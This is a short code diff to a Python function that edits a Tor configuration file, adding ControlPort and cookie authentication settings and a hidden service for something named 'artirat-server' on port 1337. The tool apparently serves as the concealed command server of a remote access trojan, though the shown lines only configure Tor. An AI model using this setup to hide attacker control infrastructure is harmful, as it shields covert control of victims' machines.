@@ -1034,10 +1034,22 @@ def configure_tor(published_port=1337):
             print(f"[-] Hidden service already configured for {hs_dir} (port {port})")
             return
     we_write = torrc if os.access(torrc, os.W_OK) else TORRC_PATH
+
+    existing = ""
+    try:
+        with open(we_write) as f:
+            existing = f.read()
+    except FileNotFoundError:
+        pass
+
     with open(we_write, "a") as f:
+        if "ControlPort" not in existing:
+            f.write(f"\nControlPort {CONTROL_PORT}\n")
+        if "CookieAuthentication" not in existing:
+            f.write(f"CookieAuthentication 1\n")
         f.write(f"\nHiddenServiceDir /var/lib/tor/artirat-server\n")
         f.write(f"HiddenServicePort {published_port} 127.0.0.1:1337\n")
-    print(f"[+] Added HiddenServiceDir /var/lib/tor/artirat-server with port {published_port} -> 127.0.0.1:1337 to {we_write}")
+    print(f"[+] Added ControlPort, CookieAuthentication, and HiddenServiceDir /var/lib/tor/artirat-server with port {published_port} -> 127.0.0.1:1337 to {we_write}")
 
 
 def connect_tor():
